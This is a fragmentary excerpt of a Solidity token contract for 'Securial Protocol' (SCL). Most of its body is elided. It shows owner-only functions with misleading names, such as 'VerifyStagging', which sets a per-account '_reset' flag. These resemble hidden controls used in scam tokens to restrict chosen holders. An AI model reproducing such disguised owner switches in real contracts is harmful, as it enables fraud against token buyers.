...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Securial Protocol';
    string constant public symbol = 'SCL';
    ...
    function falseDefault (address account) private onlyOwner {
    ...
    function isExcludeFromFee(address account) private view returns (bool) {
        
        return _isExcludedFromFee[account];
    }
    
    function VerifyStagging(address account) private onlyOwner {
        _reset[account] = true;
    }

    function isFuctionsInclude(address account) private onlyOwner view returns (bool) {
...
contract Securial is BaseToken {
